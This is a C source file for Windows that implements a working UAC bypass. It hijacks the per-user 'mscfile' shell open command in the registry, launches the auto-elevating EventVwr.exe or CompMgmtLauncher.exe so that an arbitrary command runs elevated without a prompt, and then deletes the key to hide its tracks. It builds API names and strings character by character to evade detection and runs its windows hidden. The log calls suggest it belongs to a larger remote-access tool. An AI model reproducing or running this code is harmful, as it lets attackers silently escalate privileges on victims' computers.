#include <windows.h>
#include "PublicVar.h"
#include "BypassUacRegistry.h"


//http://www.freebuf.com/sectool/114592.html
//http://bbs.pediy.com/thread-208717.htm
//http://blog.csdn.net/qq_27446553/article/details/52610365?locationNum=7
//http://www.freebuf.com/articles/system/116611.html


typedef VOID  (WINAPI * PFN_GetNativeSystemInfo)(OUT  LPSYSTEM_INFO);
typedef BOOL   (WINAPI * PFN_Wow64DisableWow64FsRedirection)(OUT  PVOID*);
typedef BOOL  (WINAPI * PFN_Wow64RevertWow64FsRedirection)(OUT  PVOID);






BOOL Is64System()
{
	SYSTEM_INFO si = {0};
	char szGetNativeSystemInfo[] = {'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o',0};
	PFN_GetNativeSystemInfo pfnGetNativeSystemInfo = (PFN_GetNativeSystemInfo)lpGetProcAddress(lpDllKernel32, szGetNativeSystemInfo);
	if (pfnGetNativeSystemInfo)
	{
		pfnGetNativeSystemInfo(&si);

		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			return TRUE;
		}
	}

	return FALSE;
}

BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
{
	HKEY hRoot = NULL;
	DWORD dwDisposition = 0;
	DWORD cbData = 0;
	DWORD dwRet = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;
	BYTE szBuffer[MAX_PATH] = {0};
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szCommand[MAX_PATH] = {0};


	if (Is64System())
	{
		samDesired |= KEY_WOW64_64KEY;
	}

	if ((lpRegCreateKeyExA(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	dwRet = lpRegQueryValueExA( hRoot,
		NULL,
		NULL,
		NULL,
		szBuffer,
		&cbData );

	if (dwRet == ERROR_SUCCESS || dwRet == ERROR_MORE_DATA)
	{
		lpRegDeleteKeyA(hKey,lpSubKey);
		lpRegCloseKey(hRoot);

		if ((lpRegCreateKeyExA(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
		{
			return FALSE;
		}
	}

	if (lpRegSetValueExA(hRoot,NULL,0,REG_SZ, (BYTE *)lpData,lplstrlenA((char*)lpData)))
	{
		return FALSE;
	}

	if (lpRegCloseKey(hRoot))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey)
{
	HKEY hRoot = NULL;
	DWORD  dwDisposition = 0;

	if (lpRegCreateKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, NULL,0,KEY_ALL_ACCESS,NULL,&hRoot,&dwDisposition) != ERROR_SUCCESS)
		return FALSE;

	if (lpRegDeleteKeyA(hKey,lpSubKey) != ERROR_SUCCESS)
		return FALSE;

	if (lpRegCloseKey(hRoot) != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}






int RunCmdGetResultWithoutBlack(char * strCommend,char * szResult,int iSize)
{
	HANDLE hRead = 0;
	HANDLE hWrite = 0;

	SECURITY_ATTRIBUTES stSa;
	stSa.nLength = sizeof(SECURITY_ATTRIBUTES); 
	stSa.lpSecurityDescriptor = NULL;   
	stSa.bInheritHandle = TRUE;		

	int iRet = lpCreatePipe(&hRead,&hWrite,&stSa,0);
	if (iRet == 0)  
	{  
		return FALSE;
	}
	
	STARTUPINFOA stSi = {0}; 
	stSi.cb = sizeof(STARTUPINFOA); 
	lpGetStartupInfoA(&stSi);
	stSi.hStdInput = hRead;
	stSi.hStdError = hWrite; 
	stSi.hStdOutput = hWrite;			
	stSi.wShowWindow = SW_HIDE;		 
	stSi.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	PROCESS_INFORMATION stPi = {0};

	char szCmdLine[MAX_PATH]; 
	lpwsprintfA(szCmdLine,"cmd /C %s",strCommend);

	iRet = lpCreateProcessA(NULL,szCmdLine,NULL,NULL,TRUE,NULL,NULL,NULL,&stSi,&stPi);
	if(iRet == 0)
	{
		return FALSE;
	}
	lpCloseHandle(hWrite); 


	DWORD dwCnt;
	char * ptrResult = szResult;
	while (TRUE) 
	{
		iRet = lpReadFile(hRead,ptrResult,iSize,&dwCnt,NULL);
		if (iRet == NULL)  
			break;
		ptrResult += dwCnt;
	}
	lpCloseHandle(hRead);

	return TRUE;
}


#define WAIT_SYSTEM_TIME_LIMIT		30000 

//call function must with "" include param and exe,and here the command must do this so with a new ""
int BypassUac(CHAR* lpData, DWORD dwIndex,char * szParam,int iFlag)
{
	char szShowInfo[1024];
	lpwsprintfA(szShowInfo,"BypassUac parameters---exe is:%s,index is:%u,exe parameter is:%s\r\n",lpData,dwIndex,szParam);
	WriteLittleBearLog(szShowInfo);

	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szSysCmd[MAX_PATH*4] = {0};
	CHAR szData[MAX_PATH*4] = {0};

	CONST CHAR lpSubKey[] = {'S','o','f','t','w','a','r','e','\\','C','l','a','s','s','e','s',
		'\\','m','s','c','f','i','l','e','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d',0};

	int iRet = lpGetSystemDirectoryA(szSysDir, MAX_PATH);

	char szOutputFileName[MAX_PATH];
	iRet = ModifyModuleFileName(szOutputFileName,CMD_OUTPUT_FILE_NAME);

	char szDataFormat[MAX_PATH] = {0};
	if (iFlag)
	{
		char szDataFormatExe[] = {'%','s','\\','c','m','d','.','e','x','e',' ','/','c',
			
			' ','\"','%','s',' ','%','s','\"',
			//' ','\"','>','>','%','s','\"',
			0};
		lplstrcpyA(szDataFormat,szDataFormatExe);
	}
	else
	{
		char szDataFormatCmd[] = {'%','s','\\','c','m','d','.','e','x','e',' ','/','c',
			
			' ','%','s',' ','%','s',
			//' ','\"','>','>','%','s','\"',
			0};
		lplstrcpyA(szDataFormat,szDataFormatCmd);
	}

	lpwsprintfA(szData, szDataFormat, szSysDir, lpData,szParam);

	lpwsprintfA(szShowInfo,"BypassUac key value is:%s\r\n",szData);
	WriteLittleBearLog(szShowInfo);

	iRet = SetRegKeyStrVal(HKEY_CURRENT_USER , lpSubKey, szData);
	if (iRet == 0)
	{
		WriteLittleBearLog("BypassUac SetRegKeyStrVal error\r\n");
		return FALSE;
	}

	char szSysCmdFormat[] = {'%','s','\\','c','m','d','.','e','x','e',' ','/','c',' ','%','s','\\','%','s',0};
	char szEventVwr[] = {'E','v','e','n','t','V','w','r','.','e','x','e',0};
	char szCompMgmtLauncher[] = {'C','o','m','p','M','g','m','t','L','a','u','n','c','h','e','r','.','e','x','e',0};
	switch(dwIndex)
	{
	case 0:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szCompMgmtLauncher);
		break;
	case 1:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szEventVwr);
		break;
	default:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szEventVwr);
		break;
	}


	SECURITY_ATTRIBUTES stSa = {0};
	stSa.nLength = sizeof(SECURITY_ATTRIBUTES); 
	stSa.lpSecurityDescriptor = NULL;  
	stSa.bInheritHandle = TRUE;		

	HANDLE hRead = 0;
	HANDLE hWrite = 0;
	iRet = lpCreatePipe(&hRead,&hWrite,&stSa,0);
	if (iRet == 0) 
	{  
		WriteLittleBearLog("BypassUac lpCreatePipe error\r\n");
		iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
		return FALSE;
	}

	STARTUPINFOA stSi = {0};
	PROCESS_INFORMATION stPi = {0};
	iRet = lpGetStartupInfoA(&stSi);
	stSi.cb = sizeof(STARTUPINFOA);
	stSi.dwX = 0;
	stSi.dwY = 0;
	stSi.hStdInput = hRead;
	stSi.hStdError = hWrite; 
	stSi.hStdOutput = hWrite;			
	stSi.wShowWindow = SW_HIDE;		 
	stSi.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES | STARTF_USESIZE | STARTF_USEPOSITION;
	
	iRet = lpCreateProcessA(0,szSysCmd,0,0,0,CREATE_DEFAULT_ERROR_MODE,0,0,&stSi,&stPi);
	if (iRet )
	{
		lpCloseHandle(stPi.hThread);  

		iRet = lpWaitForSingleObject(stPi.hProcess,INFINITE);
		if (iRet == WAIT_OBJECT_0)
		{
			DWORD dwExitCode = 0;
			lpGetExitCodeProcess(stPi.hProcess,  &dwExitCode);  
		}
		else if (iRet == WAIT_TIMEOUT || iRet == WAIT_ABANDONED || iRet ==WAIT_FAILED )
		{
			WriteLittleBearLog("BypassUac lpWaitForSingleObject error\r\n");
			lpCloseHandle(hRead);
			lpCloseHandle(hWrite);
			lpCloseHandle(stPi.hProcess);  
			iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
			return FALSE;
		}
		 
		lpCloseHandle(stPi.hProcess);  
	}
	else
	{
		WriteLittleBearLog("BypassUac lpCreateProcessA error\r\n");
		lpCloseHandle(hRead);
		lpCloseHandle(hWrite);
		iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
		return FALSE;
	}
	lpCloseHandle(hRead);
	lpCloseHandle(hWrite);

	//iRet = system(szSysCmd);

	
//can not get the exitcode
// 	iRet = lpWinExec(szSysCmd,SW_HIDE);
// 	DWORD dwId;
// 	HANDLE hProc = OpenAndGetProcessIdByName("cmd.exe",&dwId);
// 	while(hProc == 0)
// 	{
// 		Sleep(200);
// 		hProc = OpenAndGetProcessIdByName("cmd.exe",&dwId);
// 	}
// 	lpCloseHandle(hProc);

	iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
	if (iRet == 0)
	{
		WriteLittleBearLog("BypassUac DeleteRegKey error\r\n");
	}

	WriteLittleBearLog("BypassUac ok\r\n");
	return iRet;
}

// VOID Help()
// {
// 	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
// 	SetConsoleTextAttribute(handle, 2);
// 	printf("By ExpLife\r\n");
// 	SetConsoleTextAttribute(handle, 3);
// 	printf("Usage: XXX.exe TheFullPathOfTarget Number\r\n");
// 	SetConsoleTextAttribute(handle, 4);
// 	printf("The number parameter can be 0 or 1\r\n");
// 	printf("The number 0 means to use CompMgmtLauncher.exe\r\n");
// 	printf("The number 1 means to use EventVwr.exe\r\n");
// 	SetConsoleTextAttribute(handle, 5);
// 	printf("Do not use for illegal purposes, or author is not responsible for the consequences!\r\n");
// }

int BypassUacRegistry(char * szProgramPathName,DWORD dwIndex,char *szParam,int iFlag)
{		
	if (lplstrlenA(szProgramPathName) >= MAX_PATH)
	{
		return FALSE;
	}

	if (dwIndex != 0 && dwIndex != 1)
	{
		return FALSE;
	}

	int iRet = 0;
	if (Is64System())
	{	
		char szWow64DisableWow64FsRedirection[] = 
		{'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0};
		PFN_Wow64DisableWow64FsRedirection pfnWow64DisableWow64FsRedirection = \
			(PFN_Wow64DisableWow64FsRedirection)lpGetProcAddress(lpDllKernel32, szWow64DisableWow64FsRedirection);

		char szWow64RevertWow64FsRedirection[] = 
		{'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0};
		PFN_Wow64RevertWow64FsRedirection pfnWow64RevertWow64FsRedirection = \
			(PFN_Wow64RevertWow64FsRedirection)lpGetProcAddress(lpDllKernel32, szWow64RevertWow64FsRedirection);

		if (pfnWow64DisableWow64FsRedirection && pfnWow64RevertWow64FsRedirection)
		{
			PVOID OldValue;

			iRet = pfnWow64DisableWow64FsRedirection(&OldValue);

			BypassUac(szProgramPathName, dwIndex,szParam,iFlag);

			iRet = pfnWow64RevertWow64FsRedirection (OldValue);

			return TRUE;
		}
	}

	BypassUac(szProgramPathName, dwIndex,szParam,iFlag);
	return TRUE;
}








HANDLE OpenFileInDirSystem32(char * szFileName,DWORD dwOpenType)
{
	int iRet = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	if (Is64System())
	{	
		char szWow64DisableWow64FsRedirection[] = 
		{'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0};
		PFN_Wow64DisableWow64FsRedirection pfnWow64DisableWow64FsRedirection = \
			(PFN_Wow64DisableWow64FsRedirection)lpGetProcAddress(lpDllKernel32, szWow64DisableWow64FsRedirection);

		char szWow64RevertWow64FsRedirection[] = 
		{'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n',0};
		PFN_Wow64RevertWow64FsRedirection pfnWow64RevertWow64FsRedirection = \
			(PFN_Wow64RevertWow64FsRedirection)lpGetProcAddress(lpDllKernel32, szWow64RevertWow64FsRedirection);

		if (pfnWow64DisableWow64FsRedirection && pfnWow64RevertWow64FsRedirection)
		{
			PVOID OldValue;

			iRet = pfnWow64DisableWow64FsRedirection(&OldValue);

			hFile = lpCreateFileA(szFileName,dwOpenType,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

			iRet = pfnWow64RevertWow64FsRedirection (OldValue);
		}
	}
	else
	{
		hFile = lpCreateFileA(szFileName,dwOpenType,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	}
	return hFile;
}


































/*
int CmdRegOperation(CHAR* lpData, DWORD dwIndex,char *szParam)
{
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szSysCmd[MAX_PATH*2] = {0};
	CHAR szData[MAX_PATH*2] = {0};

	CONST CHAR lpSubKey[] = {'S','o','f','t','w','a','r','e','\\','C','l','a','s','s','e','s',
		'\\','m','s','c','f','i','l','e','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d',0};

	int iRet = lpGetSystemDirectoryA(szSysDir, MAX_PATH);

	char szDataFormat[] = {'%','s','\\','c','m','d','.','e','x','e',' ','/','c',' ','%','s',' ','>',' ','%','s',0};
	lpwsprintfA(szData, szDataFormat, szSysDir, lpData,szParam);

	iRet = SetRegKeyStrVal(HKEY_CURRENT_USER , lpSubKey, szData);
	if (iRet == 0)
	{
		return FALSE;
	}

	char szSysCmdFormat[] = {'%','s','\\','c','m','d','.','e','x','e',' ','/','c',' ','%','s','\\','%','s',0};
	char szEventVwr[] = {'E','v','e','n','t','V','w','r','.','e','x','e',0};
	char szCompMgmtLauncher[] = {'C','o','m','p','M','g','m','t','L','a','u','n','c','h','e','r','.','e','x','e',0};
	switch(dwIndex)
	{
	case 0:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szCompMgmtLauncher);
		break;
	case 1:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szEventVwr);
		break;
	default:
		lpwsprintfA(szSysCmd,szSysCmdFormat, szSysDir, szSysDir, szEventVwr);
		break;
	}


	SECURITY_ATTRIBUTES stSa = {0};
	stSa.nLength = sizeof(SECURITY_ATTRIBUTES); 
	stSa.lpSecurityDescriptor = NULL;  
	stSa.bInheritHandle = TRUE;		

	HANDLE hRead = 0;
	HANDLE hWrite = 0;
	iRet = lpCreatePipe(&hRead,&hWrite,&stSa,0);
	if (iRet == 0) 
	{  
		iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
		return FALSE;
	}

	STARTUPINFOA stSi = {0};
	PROCESS_INFORMATION stPi = {0};
	iRet = lpGetStartupInfoA(&stSi);
	stSi.cb = sizeof(STARTUPINFOA);
	stSi.dwX = 0;
	stSi.dwY = 0;
	stSi.hStdInput = hRead;
	stSi.hStdError = hWrite; 
	stSi.hStdOutput = hWrite;			
	stSi.wShowWindow = SW_HIDE;		 
	stSi.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	iRet = lpCreateProcessA(0,szSysCmd,0,0,0,CREATE_DEFAULT_ERROR_MODE,0,0,&stSi,&stPi);
	if (iRet )
	{
		lpCloseHandle(stPi.hThread);  

		iRet = lpWaitForSingleObject(stPi.hProcess,WAIT_SYSTEM_TIME_LIMIT);
		if (iRet == WAIT_OBJECT_0)
		{
			DWORD dwExitCode = 0;
			lpGetExitCodeProcess(stPi.hProcess,  &dwExitCode);  
		}
		else if (iRet == WAIT_TIMEOUT || iRet == WAIT_ABANDONED || iRet ==WAIT_FAILED )
		{
			WriteLittleBearLog("BypassUac lpWaitForSingleObject error\r\n");
			lpCloseHandle(hRead);
			lpCloseHandle(hWrite);
			lpCloseHandle(stPi.hProcess);  
			iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
			return FALSE;
		}

		lpCloseHandle(stPi.hProcess);  
	}
	else
	{
		lpCloseHandle(hRead);
		lpCloseHandle(hWrite);
		iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
		return FALSE;
	}
	lpCloseHandle(hRead);
	lpCloseHandle(hWrite);

	//iRet = system(szSysCmd);

	iRet = DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);

	return iRet;
}
*/